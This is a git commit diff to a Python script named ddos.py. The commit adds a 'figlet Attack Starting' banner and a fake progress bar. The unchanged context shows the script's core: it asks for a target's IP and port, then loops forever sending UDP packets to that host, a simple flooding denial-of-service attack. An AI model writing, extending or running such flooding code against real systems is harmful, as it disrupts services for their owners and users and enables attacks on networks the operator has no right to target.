55df990c2897ffa27692f845a67b863b7534df80
Seyed Ali Javadi Moghadam <42797703+javadimoghadam@users.noreply.github.com>
2020-03-28 00:46:30 +0430

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -18,6 +18,17 @@ print
 ip = raw_input("Target\'s IP : ")
 port = input("Port : ")
 os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
